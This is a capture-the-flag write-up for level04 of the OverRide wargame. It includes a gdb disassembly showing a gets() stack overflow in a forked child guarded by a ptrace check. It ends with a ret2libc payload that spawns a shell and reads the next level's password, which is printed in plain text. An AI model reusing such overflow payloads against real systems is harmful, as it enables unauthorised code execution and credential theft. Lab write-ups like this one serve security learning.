# Level 04

There's a trap you can see in the source

```
level04@OverRide:~$ gdb ./level04
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret    
End of assembler dump.
gdb-peda$ b *0x08048763
Breakpoint 1 at 0x8048763
gdb-peda$ r
[New process 1701]
Give me some shellcode, k
asdf
[Switching to process 1701]

[----------------------------------registers-----------------------------------]
EAX: 0xffffd680 ("asdf")
EBX: 0xffffd680 ("asdf")
ECX: 0xf7fd08c4 --> 0x0
EDX: 0xffffd680 ("asdf")
ESI: 0x0
EDI: 0xffffd700 --> 0xf7feb620 (push   ebp)
EBP: 0xffffd718 --> 0x0
ESP: 0xffffd660 --> 0xffffd680 ("asdf")
EIP: 0x8048763 (<main+155>:	jmp    0x804881a <main+338>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048757 <main+143>:	lea    eax,[esp+0x20]
   0x804875b <main+147>:	mov    DWORD PTR [esp],eax
   0x804875e <main+150>:	call   0x80484b0 <gets@plt>
=> 0x8048763 <main+155>:	jmp    0x804881a <main+338>
 | 0x8048768 <main+160>:	nop
 | 0x8048769 <main+161>:	lea    eax,[esp+0x1c]
 | 0x804876d <main+165>:	mov    DWORD PTR [esp],eax
 | 0x8048770 <main+168>:	call   0x80484f0 <wait@plt>
 |->   0x804881a <main+338>:	mov    eax,0x0
       0x804881f <main+343>:	lea    esp,[ebp-0x8]
       0x8048822 <main+346>:	pop    ebx
       0x8048823 <main+347>:	pop    edi
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd660 --> 0xffffd680 ("asdf")
0004| 0xffffd664 --> 0x0
0008| 0xffffd668 --> 0x0
0012| 0xffffd66c --> 0x0
0016| 0xffffd670 --> 0xb80
0020| 0xffffd674 --> 0x0
0024| 0xffffd678 --> 0xf7fdc714 --> 0x20e28
0028| 0xffffd67c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048763 in main ()
gdb-peda$

```

Final exploit:

```
level04@OverRide:~$ python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"BBBB"+"\xec\x97\xf8\xf7"' > /tmp/payload
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
